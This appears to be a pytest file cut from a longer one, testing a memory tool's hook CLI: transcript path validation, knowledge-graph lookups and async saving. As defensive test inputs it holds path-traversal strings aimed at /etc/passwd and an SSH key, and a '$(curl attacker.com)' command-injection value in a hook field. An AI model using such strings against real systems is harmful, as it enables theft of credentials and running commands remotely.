    """Paths with '..' components should be rejected."""
    assert _validate_transcript_path("../../etc/passwd") is None
    assert _validate_transcript_path("../../../.ssh/id_rsa") is None


def test_validate_transcript_rejects_wrong_extension():
    """Only .jsonl and .json extensions are accepted."""
    assert _validate_transcript_path("/tmp/transcript.txt") is None
    assert _validate_transcript_path("/tmp/secret.py") is None
    assert _validate_transcript_path("/home/user/.ssh/id_rsa") is None


def test_validate_transcript_accepts_valid_paths(tmp_path):
    """Valid .jsonl and .json paths should be accepted."""
    jsonl_path = tmp_path / "session.jsonl"
    jsonl_path.touch()
    result = _validate_transcript_path(str(jsonl_path))
    assert result is not None
    assert result.suffix == ".jsonl"

    json_path = tmp_path / "session.json"
    json_path.touch()
    result = _validate_transcript_path(str(json_path))
    assert result is not None
    assert result.suffix == ".json"


def test_validate_transcript_empty_string():
    """Empty transcript path should return None."""
    assert _validate_transcript_path("") is None


def test_count_rejects_traversal_path():
    """_count_human_messages should return 0 for path traversal attempts."""
    assert _count_human_messages("../../etc/passwd") == 0


def test_count_logs_warning_on_rejected_path(tmp_path):
    """_count_human_messages should log a warning when a non-empty path is rejected."""
    with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
        with patch("mempalace.hooks_cli._log") as mock_log:
            _count_human_messages("../../etc/passwd")
    mock_log.assert_called_once()
    assert "rejected" in mock_log.call_args[0][0].lower()


def test_validate_transcript_accepts_platform_native_path(tmp_path):
    """Validator accepts platform-native paths (backslashes on Windows, slashes on Unix)."""
    session_file = tmp_path / "projects" / "abc123" / "session.jsonl"
    session_file.parent.mkdir(parents=True)
    session_file.touch()
    # Use the OS-native string representation (backslashes on Windows)
    result = _validate_transcript_path(str(session_file))
    assert result is not None
    assert result.suffix == ".jsonl"
    assert result.is_file()


def test_stop_hook_rejects_injected_stop_hook_active(tmp_path):
    """stop_hook_active with shell injection string should not cause issues."""
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    # Simulate a malicious stop_hook_active value
    result = _capture_hook_output(
        hook_stop,
        {
            "session_id": "test",
            "stop_hook_active": "$(curl attacker.com)",
            "transcript_path": str(transcript),
        },
        state_dir=tmp_path,
    )
    # The injected value is not "true"/"1"/"yes", so the hook should NOT pass through
    # It should count messages and trigger async save (non-blocking)
    assert result == {}


# --- _collect_kg_candidates: CJK token handling + rerank-pool shape ---


def test_kg_candidates_keep_cjk_bigrams(monkeypatch):
    """CJK bigrams (len 2) must NOT be filtered out by the length check.

    The tokenizer emits 2-char bigrams for Chinese runs. A plain
    ``len(t) >= 3`` predicate drops all of them, so Chinese queries
    would yield zero entities and skip the KG lookup entirely.
    """
    from mempalace import hooks_cli

    queried: list = []

    class _FakeKG:
        def query_entity(self, entity, direction="both"):
            queried.append(entity)
            return []

        def close(self):
            pass

    # Force the KG constructor to return our fake so we can see every
    # entity it's asked about.
    import mempalace.knowledge_graph as kg_mod

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", lambda *a, **kw: _FakeKG())

    hooks_cli._collect_kg_candidates(query="我养了几只猫")

    # At least one CJK bigram should have been looked up.
    assert queried, "Expected at least one CJK token to be queried, got none"
    assert any(hooks_cli._CJK_CHAR_RE.search(t) for t in queried), (
        f"Expected CJK tokens in {queried!r}"
    )


def test_kg_candidates_still_keep_long_latin_tokens(monkeypatch):
    """Regression guard: long Latin tokens should still be queried."""
    from mempalace import hooks_cli

    queried: list = []

    class _FakeKG:
        def query_entity(self, entity, direction="both"):
            queried.append(entity)
            return []

        def close(self):
            pass

    import mempalace.knowledge_graph as kg_mod

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", lambda *a, **kw: _FakeKG())

    hooks_cli._collect_kg_candidates(query="Alice works at Acme Corporation")

    assert any(t.lower() in {"alice", "works", "acme", "corporation"} for t in queried), (
        f"Expected Latin tokens in {queried!r}"
    )


def test_kg_candidates_short_latin_tokens_still_filtered(monkeypatch):
    """Sanity: 2-char non-CJK tokens should NOT be queried (noise filter intact)."""
    from mempalace import hooks_cli

    queried: list = []

    class _FakeKG:
        def query_entity(self, entity, direction="both"):
            queried.append(entity)
            return []

        def close(self):
            pass

    import mempalace.knowledge_graph as kg_mod

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", lambda *a, **kw: _FakeKG())

    hooks_cli._collect_kg_candidates(query="it is at to")

    for t in queried:
        assert len(t) >= 3 or hooks_cli._CJK_CHAR_RE.search(t), (
            f"Unexpectedly queried short non-CJK token {t!r}"
        )


def test_kg_candidates_returns_rerank_ready_dicts(monkeypatch):
    """Returned candidates must have the same shape as drawer hits so they
    drop into the rerank pool without special-casing."""
    from mempalace import hooks_cli

    class _FakeKG:
        def list_entity_names(self):
            return ["LiteLLM"]

        def query_entity(self, entity, direction="both"):
            return [
                {
                    "subject": "LiteLLM",
                    "predicate": "endpoints",
                    "object": "127.0.0.1:4000",
                    "valid_to": None,
                },
                {
                    "subject": "LiteLLM",
                    "predicate": "deprecated",
                    "object": "old_alias",
                    "valid_to": "2026-01-01",  # closed fact — must be skipped
                },
            ]

        def close(self):
            pass

    import mempalace.knowledge_graph as kg_mod

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", lambda *a, **kw: _FakeKG())

    candidates = hooks_cli._collect_kg_candidates(query="how do I configure litellm")

    assert len(candidates) == 1, "Closed fact should be filtered"
    c = candidates[0]
    assert c["matched_via"] == "kg"
    assert c["wing"] == "kg"
    assert c["room"] == "triple"
    assert c["text"] == "LiteLLM → endpoints → 127.0.0.1:4000"
    # Required fields for downstream rerank/format code:
    assert "similarity" in c
    assert "distance" in c
    assert "created_at" in c


# --- _ASYNC_SAVE_PROMPT language consistency guidance ---


def test_async_save_prompt_requires_predicate_language_consistency():
    """The async-save prompt must instruct the model to match predicate language
    to subject/object language (e.g. Chinese → Chinese predicate, English → English)."""
    from mempalace.hooks_cli import _ASYNC_SAVE_PROMPT

    # Critical heading is present
    assert "Language consistency (critical)" in _ASYNC_SAVE_PROMPT

    # Chinese predicate guidance is explicit
    assert "使用" in _ASYNC_SAVE_PROMPT
    assert "修复" in _ASYNC_SAVE_PROMPT

    # The Chinese personal-fact few-shot uses Chinese predicates (e.g. 居住于 / 就职于)
    assert "居住于" in _ASYNC_SAVE_PROMPT

    # The prompt must still be a valid Python format string with {wing}/{transcript}
    formatted = _ASYNC_SAVE_PROMPT.format(wing="test_wing", transcript="sample")
    assert "test_wing" in formatted
    assert "sample" in formatted


# --- _get_palace_kg_entities ---


def test_get_palace_kg_entities_returns_top_entities_by_triple_count(monkeypatch, tmp_path):
    """Top entities are ranked by current-triple participation count."""
    from mempalace import hooks_cli
    from mempalace.knowledge_graph import KnowledgeGraph

    db_path = str(tmp_path / "kg.sqlite3")
    kg = KnowledgeGraph(db_path=db_path)
    # alpha_project participates in 3 triples; beta_stack in 2; gamma_tool in 1.
    kg.add_triple("alpha_project", "uses", "python")
    kg.add_triple("alpha_project", "depends_on", "beta_stack")
    kg.add_triple("user", "works_on", "alpha_project")
    kg.add_triple("beta_stack", "includes", "alpha_project")
    kg.add_triple("beta_stack", "hosted_at", "aws")
    kg.add_triple("gamma_tool", "is_a", "cli")
    kg.close()

    # Patch the lazy import inside _get_palace_kg_entities so it points at our temp DB.
    def _kg_factory():
        return KnowledgeGraph(db_path=db_path)

    import mempalace.knowledge_graph as kg_mod

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", _kg_factory)

    names = hooks_cli._get_palace_kg_entities(limit=10)
    assert "alpha_project" in names
    assert "beta_stack" in names
    assert "gamma_tool" in names
    # alpha_project should rank first (most triples).
    assert names[0] == "alpha_project"


def test_get_palace_kg_entities_skips_expired_triples(monkeypatch, tmp_path):
    """Entities only present in expired (valid_to set) triples are excluded."""
    from mempalace import hooks_cli
    from mempalace.knowledge_graph import KnowledgeGraph

    db_path = str(tmp_path / "kg.sqlite3")
    kg = KnowledgeGraph(db_path=db_path)
    kg.add_triple("ActiveProj", "uses", "Postgres")
    # Add a triple, then invalidate it so OldProj has no current triples.
    kg.add_triple("OldProj", "uses", "MySQL")
    kg.invalidate("OldProj", "uses", "MySQL", ended="2025-01-01")
    kg.close()

    def _kg_factory():
        return KnowledgeGraph(db_path=db_path)

    import mempalace.knowledge_graph as kg_mod

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", _kg_factory)

    names = hooks_cli._get_palace_kg_entities(limit=10)
    assert "ActiveProj" in names
    # OldProj's only triple is expired, so it shouldn't appear.
    assert "OldProj" not in names


def test_get_palace_kg_entities_returns_empty_on_failure(monkeypatch):
    """Defensive: any KG failure returns []."""
    from mempalace import hooks_cli
    import mempalace.knowledge_graph as kg_mod

    def _broken(*_args, **_kwargs):
        raise RuntimeError("kg unavailable")

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", _broken)
    assert hooks_cli._get_palace_kg_entities(limit=10) == []


def test_get_palace_kg_entities_respects_limit(monkeypatch, tmp_path):
    from mempalace import hooks_cli
    from mempalace.knowledge_graph import KnowledgeGraph

    db_path = str(tmp_path / "kg.sqlite3")
    kg = KnowledgeGraph(db_path=db_path)
    for i in range(5):
        kg.add_triple(f"Entity{i}", "is_a", "thing")
    kg.close()

    def _kg_factory():
        return KnowledgeGraph(db_path=db_path)

    import mempalace.knowledge_graph as kg_mod

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", _kg_factory)

    names = hooks_cli._get_palace_kg_entities(limit=3)
    # 5 entities + "thing" appears as object → at most 3 returned.
    assert len(names) <= 3


# ===========================================================================
# JSON-extraction helper + async save dump-on-failure
# ===========================================================================


class TestExtractFirstJsonObject:
    def test_clean_object(self):
        assert _extract_first_json_object('{"a": 1}') == '{"a": 1}'

    def test_brace_inside_string_does_not_close(self):
        text = '{"k": "}"}'
        assert _extract_first_json_object(text) == '{"k": "}"}'

    def test_escaped_quote_inside_string(self):
        text = r'{"k": "say \"hi\""}'
        assert _extract_first_json_object(text) == r'{"k": "say \"hi\""}'

    def test_prose_before_and_after(self):
        text = 'prefix {"a": 1} suffix'
        assert _extract_first_json_object(text) == '{"a": 1}'

    def test_two_objects_returns_first(self):
        text = '{"a": 1} {"b": 2}'
        assert _extract_first_json_object(text) == '{"a": 1}'

    def test_nested_objects(self):
        text = '{"a": {"b": {"c": 1}}}'
        assert _extract_first_json_object(text) == '{"a": {"b": {"c": 1}}}'

    def test_no_object_returns_none(self):
        assert _extract_first_json_object("not json at all") is None

    def test_unbalanced_returns_none(self):
        # Opens but never closes — should return None
        assert _extract_first_json_object('{"a": 1') is None

    def test_empty_string(self):
        assert _extract_first_json_object("") is None


class TestAsyncSaveDumpOnFailure:
    def test_dumps_raw_response_when_json_parse_fails(self, tmp_path, monkeypatch):
        from mempalace import hooks_cli, recall_llm

        # Patch state dir so dump goes to tmp_path
        monkeypatch.setattr(hooks_cli, "STATE_DIR", tmp_path)
        # Avoid touching real palace + extra context build
        monkeypatch.setattr(hooks_cli, "_build_palace_context", lambda: "")

        # Force an LLM config + return obviously bad JSON-like response
        monkeypatch.setattr(recall_llm, "_get_llm_config", lambda: {"backend": "stub"})
        bad_response = "garbage no braces at all here"
        monkeypatch.setattr(recall_llm, "_call_llm", lambda *a, **kw: bad_response)

        hooks_cli._async_save_worker("user: hi\nassistant: hello", "test-session", str(tmp_path))

        dumps = list(tmp_path.glob("async_save_fail_*.txt"))
        assert len(dumps) == 1, f"expected exactly one dump file, got {dumps}"
        contents = dumps[0].read_text(encoding="utf-8")
        assert bad_response in contents
        assert "ERROR:" in contents
        assert "=== RAW RESPONSE ===" in contents

    def test_dumps_when_json_is_malformed(self, tmp_path, monkeypatch):
        from mempalace import hooks_cli, recall_llm

        monkeypatch.setattr(hooks_cli, "STATE_DIR", tmp_path)
        monkeypatch.setattr(hooks_cli, "_build_palace_context", lambda: "")
        monkeypatch.setattr(recall_llm, "_get_llm_config", lambda: {"backend": "stub"})
        # Has braces but invalid JSON inside
        bad_response = '{"diary": "oops" "drawers": [missing comma]}'
        monkeypatch.setattr(recall_llm, "_call_llm", lambda *a, **kw: bad_response)

        hooks_cli._async_save_worker("user: hi\nassistant: hello", "test-session", str(tmp_path))

        dumps = list(tmp_path.glob("async_save_fail_*.txt"))
        assert len(dumps) == 1
        assert bad_response in dumps[0].read_text(encoding="utf-8")


class TestAsyncSavePromptHardening:
    def test_async_save_prompt_includes_escape_rule(self):
        from mempalace.hooks_cli import _ASYNC_SAVE_PROMPT

        assert "MUST be escaped as" in _ASYNC_SAVE_PROMPT


class TestAsyncSaveTriggersAutoLink:
    """After writing drawers, the save worker must call auto_link_shared_rooms
    with the (wing, room) pairs it just wrote — this is the deterministic
    'same room across wings → tunnel bridge' guarantee."""

    def test_auto_link_called_with_saved_pairs(self, tmp_path, monkeypatch):
        from mempalace import hooks_cli, recall_llm
        from mempalace import palace as palace_mod
        from mempalace import palace_graph as graph_mod

        monkeypatch.setattr(hooks_cli, "STATE_DIR", tmp_path)
        monkeypatch.setattr(hooks_cli, "_build_palace_context", lambda: "")
        monkeypatch.setattr(recall_llm, "_get_llm_config", lambda: {"backend": "stub"})

        response = (
            '{"diary": "", '
            '"drawers": ['
            '{"wing": "alpha", "room": "auth-migration", '
            '"content": "Long enough drawer content describing the auth migration"},'
            '{"wing": "alpha", "room": "graphql-switch", '
            '"content": "Long enough drawer content for graphql switch decision"}'
            '], "kg": [], "tunnels": []}'
        )
        monkeypatch.setattr(recall_llm, "_call_llm", lambda *a, **kw: response)

        class _FakeCol:
            def add(self, **kw):
                pass

            def upsert(self, **kw):
                pass

        monkeypatch.setattr(palace_mod, "get_collection", lambda *a, **kw: _FakeCol())

        seen_pairs = []

        def _stub_auto_link(saved_pairs, col=None, config=None, max_per_save=5):
            seen_pairs.append(list(saved_pairs))
            return []

        monkeypatch.setattr(graph_mod, "auto_link_shared_rooms", _stub_auto_link)
        monkeypatch.setattr(graph_mod, "invalidate_graph_cache", lambda: None)

        hooks_cli._async_save_worker("user: ...\nassistant: ...", "test-session", str(tmp_path))

        assert len(seen_pairs) == 1, "auto_link_shared_rooms should be called exactly once"
        assert ("alpha", "auth-migration") in seen_pairs[0]
        assert ("alpha", "graphql-switch") in seen_pairs[0]

    def test_auto_link_skipped_when_no_drawers_saved(self, tmp_path, monkeypatch):
        from mempalace import hooks_cli, recall_llm
        from mempalace import palace as palace_mod
        from mempalace import palace_graph as graph_mod

        monkeypatch.setattr(hooks_cli, "STATE_DIR", tmp_path)
        monkeypatch.setattr(hooks_cli, "_build_palace_context", lambda: "")
        monkeypatch.setattr(recall_llm, "_get_llm_config", lambda: {"backend": "stub"})
        response = (
            '{"diary": "Long enough diary entry to be worth storing right here", '
            '"drawers": [], "kg": [], "tunnels": []}'
        )
        monkeypatch.setattr(recall_llm, "_call_llm", lambda *a, **kw: response)

        class _FakeCol:
            def add(self, **kw):
                pass

            def upsert(self, **kw):
                pass

        monkeypatch.setattr(palace_mod, "get_collection", lambda *a, **kw: _FakeCol())

        called = {"n": 0}

        def _stub_auto_link(*a, **kw):
            called["n"] += 1
            return []

        monkeypatch.setattr(graph_mod, "auto_link_shared_rooms", _stub_auto_link)
        monkeypatch.setattr(graph_mod, "invalidate_graph_cache", lambda: None)

        hooks_cli._async_save_worker("user: ...\nassistant: ...", "test-session", str(tmp_path))

        # No drawers → saved_pairs is empty → auto_link is not invoked.
        assert called["n"] == 0


# --- preferred_wing propagation + hook-side wing validation ---


def test_build_active_context_includes_preferred_wing(tmp_path):
    from mempalace.hooks_cli import _build_active_context

    # No palace, no entities — but preferred_wing alone should still
    # promote the return value to a dict that includes the hint.
    with patch("mempalace.hooks_cli._get_palace_kg_entities", return_value=[]):
        ctx = _build_active_context("/tmp/hermes-agent", preferred_wing="hermes_agent")

    assert isinstance(ctx, dict)
    assert ctx["preferred_wing"] == "hermes_agent"
    assert ctx["cwd"] == "/tmp/hermes-agent"


def test_build_active_context_falls_back_to_cwd_when_no_extras(tmp_path):
    from mempalace.hooks_cli import _build_active_context

    with patch("mempalace.hooks_cli._get_palace_kg_entities", return_value=[]):
        ctx = _build_active_context("/tmp/hermes-agent")

    # No preferred_wing, no palace, no entities — still a plain string
    # to preserve backward-compatible behaviour.
    assert ctx == "/tmp/hermes-agent"


def test_userprompt_applies_gate_wing_filter(tmp_path):
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()

    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()
    search_calls = {}

    def fake_search_memories(**kwargs):
        search_calls.update(kwargs)
        return {
            "results": [
                {"wing": "hermes_agent", "room": "bugs", "text": f"hit {i}"} for i in range(3)
            ]
        }

    def fake_decide_recall(*args, **kwargs):
        return {
            "should_recall": True,
            "reason": "project_bug_query",
            "query": "测试失败 排查",
            "after": None,
            "filters": {"wing": "hermes_agent", "room": "bugs", "hall": None},
        }

    def fake_rerank(user_prompt, hits, top_k=5, config=None, previous_assistant_context=None):
        return hits[:top_k]

    # Palace taxonomy validation: wing matches preferred_wing (inferred from cwd),
    # so it should pass validation even if the palace has no entries.
    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "1"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch(
                    "mempalace.hooks_cli._get_palace_taxonomy",
                    return_value={"rooms": ["bugs"], "halls": [], "wings": ["hermes_agent"]},
                ):
                    with patch("mempalace.hooks_cli._get_palace_kg_entities", return_value=[]):
                        with patch(
                            "mempalace.searcher.search_memories",
                            side_effect=fake_search_memories,
                        ):
                            with patch("mempalace.recall_llm.is_enabled", return_value=True):
                                with patch(
                                    "mempalace.recall_llm._get_llm_config",
                                    return_value={"backend": "stub"},
                                ):
                                    with patch(
                                        "mempalace.recall_llm.decide_recall",
                                        side_effect=fake_decide_recall,
                                    ):
                                        with patch(
                                            "mempalace.recall_llm.rerank",
                                            side_effect=fake_rerank,
                                        ):
                                            _capture_hook_output(
                                                hook_userprompt,
                                                {
                                                    "session_id": "session-a",
                                                    "prompt": "测试失败怎么查",
                                                    "cwd": "/tmp/hermes-agent",
                                                },
                                                state_dir=tmp_path,
                                            )

    assert search_calls.get("wing") == "hermes_agent"
    assert search_calls.get("room") == "bugs"


def test_userprompt_drops_unknown_wing(tmp_path):
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()

    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()
    search_calls = []

    def fake_search_memories(**kwargs):
        search_calls.append(kwargs)
        return {"results": []}

    def fake_decide_recall(*args, **kwargs):
        return {
            "should_recall": True,
            "reason": "project_bug_query",
            "query": "测试失败 排查",
            "after": None,
            "filters": {"wing": "nonexistent_project", "room": None, "hall": None},
        }

    def fake_rerank(user_prompt, hits, top_k=5, config=None, previous_assistant_context=None):
        return hits[:top_k]

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "1"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch(
                    "mempalace.hooks_cli._get_palace_taxonomy",
                    return_value={
                        "rooms": ["bugs"],
                        "halls": [],
                        "wings": ["hermes_agent", "mempalace"],
                    },
                ):
                    with patch("mempalace.hooks_cli._get_palace_kg_entities", return_value=[]):
                        with patch(
                            "mempalace.searcher.search_memories",
                            side_effect=fake_search_memories,
                        ):
                            with patch("mempalace.recall_llm.is_enabled", return_value=True):
                                with patch(
                                    "mempalace.recall_llm._get_llm_config",
                                    return_value={"backend": "stub"},
                                ):
                                    with patch(
                                        "mempalace.recall_llm.decide_recall",
                                        side_effect=fake_decide_recall,
                                    ):
                                        with patch(
                                            "mempalace.recall_llm.rerank",
                                            side_effect=fake_rerank,
                                        ):
                                            _capture_hook_output(
                                                hook_userprompt,
                                                {
                                                    "session_id": "session-a",
                                                    "prompt": "测试失败怎么查",
                                                    "cwd": "/tmp/hermes-agent",
                                                },
                                                state_dir=tmp_path,
                                            )

    # The hallucinated wing must NOT have reached search_memories.
    assert search_calls, "search_memories should have been called"
    assert search_calls[0].get("wing") is None


# --- KG candidates flow through rerank ---


def test_userprompt_kg_candidates_enter_rerank_pool(tmp_path, monkeypatch):
    """KG triples must be merged into the rerank pool — not appended unfiltered.

    Previously KG triples bypassed rerank and went straight to the output,
    so topically-related-but-irrelevant facts (e.g. "LiteLLM → endpoints"
    for an "Azure gpt-image-2 config" question) leaked through. They now
    sit alongside drawer hits and get judged by the same relevance pass.
    """
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()
    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()

    def fake_search_memories(**kwargs):
        return {
            "results": [
                {"wing": "scorpion", "room": "configuration", "text": "drawer hit one"},
                {"wing": "scorpion", "room": "configuration", "text": "drawer hit two"},
            ]
        }

    class _FakeKG:
        def list_entity_names(self):
            return ["LiteLLM"]

        def query_entity(self, entity, direction="both"):
            return [
                {
                    "subject": "LiteLLM",
                    "predicate": "endpoints",
                    "object": "127.0.0.1:4000",
                    "valid_to": None,
                },
                {
                    "subject": "LiteLLM",
                    "predicate": "缺失",
                    "object": "context_length_字段",
                    "valid_to": None,
                },
            ]

        def close(self):
            pass

    import mempalace.knowledge_graph as kg_mod

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", lambda *a, **kw: _FakeKG())

    rerank_seen: dict = {}

    def fake_rerank(user_prompt, hits, top_k=5, config=None, previous_assistant_context=None):
        rerank_seen["pool"] = list(hits)
        # Keep the drawer hit only — simulate rerank dropping irrelevant KG noise.
        return [h for h in hits if h.get("matched_via") != "kg"][:top_k]

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "1"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch("mempalace.searcher.search_memories", side_effect=fake_search_memories):
                    with patch("mempalace.recall_llm.is_enabled", return_value=True):
                        with patch(
                            "mempalace.recall_llm._get_llm_config",
                            return_value={"backend": "stub"},
                        ):
                            with patch(
                                "mempalace.recall_llm.decide_recall",
                                return_value={
                                    "should_recall": True,
                                    "reason": "config_query",
                                    "query": "configure litellm",
                                    "after": None,
                                    "filters": {},
                                },
                            ):
                                with patch(
                                    "mempalace.recall_llm.rerank",
                                    side_effect=fake_rerank,
                                ):
                                    result = _capture_hook_output(
                                        hook_userprompt,
                                        {
                                            "session_id": "session-a",
                                            "prompt": "帮我配置 litellm",
                                            "cwd": "/tmp/scorpion",
                                        },
                                        state_dir=tmp_path,
                                    )

    assert "pool" in rerank_seen, "rerank must have been called"
    pool = rerank_seen["pool"]
    kg_in_pool = [h for h in pool if h.get("matched_via") == "kg"]
    drawers_in_pool = [h for h in pool if h.get("matched_via") != "kg"]
    assert len(kg_in_pool) == 2, f"both KG triples should be in pool, got {len(kg_in_pool)}"
    assert len(drawers_in_pool) == 2, f"drawer hits should still be in pool, got {drawers_in_pool}"

    # Output must reflect rerank's decision: KG was filtered, only drawer
    # survives. So no "[KG]" line should leak into the output.
    body = result["hookSpecificOutput"]["additionalContext"]
    assert "drawer hit" in body
    assert "[KG]" not in body, (
        "rerank dropped KG triples — they should not appear in output anymore"
    )


def test_userprompt_kg_only_recall_when_no_drawer_hits(tmp_path, monkeypatch):
    """Pure-KG recall: when search returns 0 drawers but KG matches, the
    triple still has a chance to surface via rerank."""
    palace_dir = tmp_path / "palace"
    palace_dir.mkdir()
    fake_config = type("FakeConfig", (), {"palace_path": str(palace_dir)})()

    def fake_search_memories(**kwargs):
        return {"results": []}

    class _FakeKG:
        def list_entity_names(self):
            return ["用户"]

        def query_entity(self, entity, direction="both"):
            return [
                {
                    "subject": "用户",
                    "predicate": "养",
                    "object": "三只猫",
                    "valid_to": None,
                }
            ]

        def close(self):
            pass

    import mempalace.knowledge_graph as kg_mod

    monkeypatch.setattr(kg_mod, "KnowledgeGraph", lambda *a, **kw: _FakeKG())

    def fake_rerank(user_prompt, hits, top_k=5, config=None, previous_assistant_context=None):
        return list(hits[:top_k])

    with patch.dict("os.environ", {"MEMPAL_RECALL_LLM": "1"}, clear=False):
        with patch("mempalace.hooks_cli.STATE_DIR", tmp_path):
            with patch("mempalace.config.MempalaceConfig", return_value=fake_config):
                with patch("mempalace.searcher.search_memories", side_effect=fake_search_memories):
                    with patch("mempalace.recall_llm.is_enabled", return_value=True):
                        with patch(
                            "mempalace.recall_llm._get_llm_config",
                            return_value={"backend": "stub"},
                        ):
                            with patch(
                                "mempalace.recall_llm.decide_recall",
                                return_value={
                                    "should_recall": True,
                                    "reason": "personal_fact_query",
                                    "query": "用户 猫",
                                    "after": None,
                                    "filters": {},
                                },
                            ):
                                with patch(
                                    "mempalace.recall_llm.rerank",
                                    side_effect=fake_rerank,
                                ):
                                    result = _capture_hook_output(
                                        hook_userprompt,
                                        {
                                            "session_id": "session-a",
                                            "prompt": "用户养了几只猫",
                                            "cwd": "/tmp/x",
                                        },
                                        state_dir=tmp_path,
                                    )

    body = result["hookSpecificOutput"]["additionalContext"]
    assert "[KG] 用户 → 养 → 三只猫" in body


# --- Offline mode (no LLM) ---


def _make_palace(tmp_path: Path, monkeypatch) -> Path:
    palace = tmp_path / "palace"
    palace.mkdir(parents=True, exist_ok=True)
    monkeypatch.setenv("MEMPAL_PALACE_PATH", str(palace))
    monkeypatch.setenv("MEMPAL_EMBEDDING_MODEL", "default")
    return palace


def test_offline_save_worker_writes_raw_drawer(tmp_path, monkeypatch):
    from mempalace.hooks_cli import ASYNC_SAVE_TAG_OFFLINE, _async_save_worker_offline

    _make_palace(tmp_path, monkeypatch)
    transcript = (
        "User: Why does our deploy fail when the staging DB is upgraded?\n"
        "Assistant: Because the migration runner caches schema introspection "
        "results across pods and they go stale after the bump.\n"
    )

    _async_save_worker_offline(transcript, "session-offline-1", str(tmp_path / "myproj"))

    from mempalace.config import MempalaceConfig
    from mempalace.palace import get_collection

    col = get_collection(MempalaceConfig().palace_path, create=False)
    rows = col.get(where={"added_by": ASYNC_SAVE_TAG_OFFLINE})
    assert len(rows["ids"]) == 1
    meta = rows["metadatas"][0]
    assert meta["room"] == "raw_transcript"
    assert meta["wing"] == "myproj"
    assert meta["session_id"] == "session-offline-1"
    assert "migration runner caches schema introspection" in rows["documents"][0]
    assert rows["documents"][0].startswith("User: Why does our deploy fail")


def test_offline_save_worker_skips_short_transcript(tmp_path, monkeypatch):
    from mempalace.hooks_cli import ASYNC_SAVE_TAG_OFFLINE, _async_save_worker_offline

    _make_palace(tmp_path, monkeypatch)
    _async_save_worker_offline("ok", "session-short", str(tmp_path / "myproj"))

    from mempalace.config import MempalaceConfig
    from mempalace.palace import get_collection

    col = get_collection(MempalaceConfig().palace_path, create=True)
    rows = col.get(where={"added_by": ASYNC_SAVE_TAG_OFFLINE})
    assert rows["ids"] == []


def test_stop_hook_offline_dispatches_offline_worker(tmp_path, monkeypatch):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    monkeypatch.delenv("MEMPAL_OFFLINE_SAVE", raising=False)
    spawn_calls = []

    class FakeProc:
        def __init__(self, *a, **kw):
            spawn_calls.append(a[0])
            self.stdin = io.BytesIO()

    with patch("mempalace.recall_llm.is_enabled", return_value=False):
        with patch("mempalace.hooks_cli.subprocess.Popen", side_effect=FakeProc):
            with patch(
                "mempalace.hooks_cli._extract_recent_exchanges",
                return_value="x" * 200,
            ):
                _capture_hook_output(
                    hook_stop,
                    {
                        "session_id": "session-offline-2",
                        "stop_hook_active": False,
                        "transcript_path": str(transcript),
                    },
                    state_dir=tmp_path,
                )

    assert spawn_calls, "Popen should have been called for offline save"
    cmd = " ".join(spawn_calls[0])
    assert "_async_save_worker_offline" in cmd
    assert "_async_save_worker(" not in cmd  # the LLM worker call form


def test_stop_hook_offline_save_disabled_via_env(tmp_path, monkeypatch):
    transcript = tmp_path / "t.jsonl"
    _write_transcript(
        transcript,
        [{"message": {"role": "user", "content": f"msg {i}"}} for i in range(SAVE_INTERVAL)],
    )
    monkeypatch.setenv("MEMPAL_OFFLINE_SAVE", "0")
    spawn_calls = []

    class FakeProc:
        def __init__(self, *a, **kw):
            spawn_calls.append(a[0])
            self.stdin = io.BytesIO()

    with patch("mempalace.recall_llm.is_enabled", return_value=False):
        with patch("mempalace.hooks_cli.subprocess.Popen", side_effect=FakeProc):
            with patch(
                "mempalace.hooks_cli._extract_recent_exchanges",
                return_value="x" * 200,
            ):
                _capture_hook_output(
                    hook_stop,
                    {
                        "session_id": "session-offline-3",
                        "stop_hook_active": False,
                        "transcript_path": str(transcript),
                    },
                    state_dir=tmp_path,
                )

    assert not spawn_calls, "Popen should NOT have been called when MEMPAL_OFFLINE_SAVE=0"


# --- Absent palace root: hooks must not recreate ~/.mempalace ---
# When the user removes ~/.mempalace (e.g. `rm -rf`), that is the strongest
# possible "do not auto-capture" signal. Hooks must short-circuit BEFORE
# touching disk — including before the log-line that previously triggered
# STATE_DIR.mkdir() on its own.


def _redirect_palace_root(monkeypatch, tmp_path):
    """Point PALACE_ROOT and STATE_DIR at a tmp location that does NOT exist."""
    fake_root = tmp_path / "absent-mempalace"
    monkeypatch.setattr(hooks_cli_mod, "PALACE_ROOT", fake_root)
    monkeypatch.setattr(hooks_cli_mod, "STATE_DIR", fake_root / "hook_state")
    monkeypatch.setattr(hooks_cli_mod, "_state_dir_initialized", False)
    return fake_root


def test_hook_stop_does_not_create_palace_dir_when_absent(tmp_path, monkeypatch):
    fake_root = _redirect_palace_root(monkeypatch, tmp_path)
    transcript = tmp_path / "t.jsonl"
    transcript.write_text("")
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
